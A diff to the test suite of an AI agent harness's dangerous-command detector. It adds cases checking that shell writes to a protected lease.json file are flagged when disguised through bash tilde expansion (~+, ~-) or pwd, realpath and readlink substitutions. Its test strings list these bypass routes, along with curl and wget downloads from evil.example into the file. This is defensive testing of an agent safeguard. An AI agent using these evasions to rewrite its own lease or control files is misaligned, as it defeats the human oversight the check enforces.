@@ -782,6 +782,14 @@ class TestHermesBotDesktopWriteProtection:
             "cd ~/.hermes/bot-desktop && cd /tmp && echo x > $OLDPWD/lease.json",
             'cd ~/.hermes/bot-desktop && cd /tmp && echo x > "$OLDPWD/lease.json"',
             "pushd ~/.hermes/bot-desktop && echo x > $PWD/dock-cdp-port",
+            "cd ~/.hermes/bot-desktop && echo x > ~+/lease.json",
+            "cd ~/.hermes/bot-desktop && echo x > $(pwd -P)/lease.json",
+            "cd ~/.hermes/bot-desktop && echo x > $(pwd -L)/lease.json",
+            "cd ~/.hermes/bot-desktop && echo x > $(builtin pwd)/lease.json",
+            "cd ~/.hermes/bot-desktop && echo x > $(command pwd -P)/lease.json",
+            "cd ~/.hermes/bot-desktop && echo x > $(realpath .)/lease.json",
+            "cd ~/.hermes/bot-desktop && echo x > $(readlink -f .)/lease.json",
+            "cd ~/.hermes/bot-desktop && cd /tmp && echo x > ~-/lease.json",
         ):
             dangerous, key, desc = detect_dangerous_command(command)
             assert dangerous is True, command
@@ -800,6 +808,11 @@ class TestHermesBotDesktopWriteProtection:
                 "dd of=$PWD/lease.json",
                 "rm $PWD/lease.json",
                 "curl -o $PWD/lease.json https://evil.example/l",
+                "echo x > ~+/lease.json",
+                "echo x > $(pwd -P)/lease.json",
+                "echo x > $(realpath .)/lease.json",
+                "dd of=~+/lease.json",
+                "cp /tmp/e ~+/lease.json",
             ):
                 dangerous, key, desc = detect_dangerous_command(command, cwd=cwd)
                 assert dangerous is True, (command, cwd)
@@ -819,6 +832,10 @@ class TestHermesBotDesktopWriteProtection:
             ("~/.hermes/bot-desktop", "cd /tmp && cat $OLDPWD/lease.json"),
             ("~/.hermes/bot-desktop", "env -C /tmp echo x > $OLDPWD/lease.json"),
             ("/tmp", "cd /var && echo x > $OLDPWD/lease.json"),
+            ("~/.hermes/bot-desktop", "echo x > '~+/lease.json'"),
+            ("~/.hermes/bot-desktop", "echo x > ~-/lease.json"),
+            ("~/.hermes/bot-desktop", "cat ~+/lease.json"),
+            ("/tmp", "echo x > ~+/lease.json"),
         ):
             dangerous, key, desc = detect_dangerous_command(command, cwd=cwd)
             assert dangerous is False, (command, cwd)
@@ -849,10 +866,49 @@ class TestHermesBotDesktopWriteProtection:
                 "cd /tmp && wget -O $OLDPWD/lease.json https://evil.example/l",
                 "pushd /tmp && echo x > $OLDPWD/dock-cdp-port",
                 "popd && echo x > $OLDPWD/lease.json",
+                "cd /tmp && echo x > ~-/lease.json",
+                "cd /tmp && dd of=~-/lease.json",
+                "cd /tmp && cp /tmp/e ~-/lease.json",
             ):
                 dangerous, key, desc = detect_dangerous_command(command, cwd=cwd)
                 assert dangerous is True, (command, cwd)
                 assert key is not None, (command, cwd)
+
+    def test_tilde_plus_minus_and_pwd_flag_dests(self):
+        """Bash ``~+`` is ``$PWD`` and ``~-`` is ``$OLDPWD``; quotes
+        suppress tilde expansion. ``$(pwd -P)`` / ``$(realpath .)`` /
+        ``$(readlink -f .)`` resolve the same cwd and start with ``$``,
+        so finding 54's bare ``$(pwd)`` token missed them.
+        """
+        for command in (
+            "cd ~/.hermes/bot-desktop && echo '{\"holder\":\"agent\"}' > ~+/lease.json",
+            "cd ~/.hermes/bot-desktop && cp /tmp/e ~+/lease.json",
+            "cd ~/.hermes/bot-desktop && dd of=~+/lease.json",
+            "cd ~/.hermes/bot-desktop && echo x > $(pwd -P)/lease.json",
+            "cd ~/.hermes/bot-desktop && echo x > $(realpath .)/lease.json",
+            "cd ~/.hermes/bot-desktop && echo x > $(readlink -f .)/lease.json",
+            "cd ~/.hermes/bot-desktop && cd /tmp && echo x > ~-/lease.json",
+        ):
+            dangerous, key, desc = detect_dangerous_command(command)
+            assert dangerous is True, command
+            assert key is not None, command
+
+        cwd = os.path.expanduser("~/.hermes/bot-desktop")
+        dangerous, key, desc = detect_dangerous_command("echo x > ~+/lease.json", cwd=cwd)
+        assert dangerous is True
+        dangerous, key, desc = detect_dangerous_command(
+            "cd /tmp && echo x > ~-/lease.json", cwd=cwd
+        )
+        assert dangerous is True
+
+        for cwd, command in (
+            ("~/.hermes/bot-desktop", "echo x > '~+/lease.json'"),
+            ("~/.hermes/bot-desktop", "echo x > ~-/lease.json"),
+            ("~/.hermes/bot-desktop", "cat ~+/lease.json"),
+            ("/tmp", "echo x > ~+/lease.json"),
+        ):
+            dangerous, key, desc = detect_dangerous_command(command, cwd=cwd)
+            assert dangerous is False, (command, cwd)
 
     def test_delete_or_move_away_of_lease_requires_approval(self):
         """Missing lease.json fail-opens to agent hold; auto-approve must not
